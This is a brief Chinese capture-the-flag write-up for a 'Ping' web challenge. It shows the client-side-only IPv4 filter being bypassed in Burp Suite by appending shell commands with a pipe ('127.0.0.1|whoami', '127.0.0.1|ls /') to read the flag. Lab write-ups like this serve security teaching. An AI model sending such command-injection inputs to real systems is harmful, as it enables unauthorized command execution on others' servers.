# nssctf Ping wp

题目给了一个 ping 的框。通过正则过滤了只能输入 ipv4 地址：  

![](1.png)

进 burpsuite ，输入任意 ip 地址后抓包。

![](2.png)

丢给 Repeater ，加上 | whoami 看看:
``` bash
command=127.0.0.1|whoami&ping=Ping
```

![](3.png)


上面也可以看到用 js 正则过滤的信息，也就是前端限制。  

![](4.png)

改成：
``` bash
command=127.0.0.1|ls /&ping=Ping
```
![](5.png)

发现 /flag 那还说啥？  

![](6.png)

拿到 flag。  

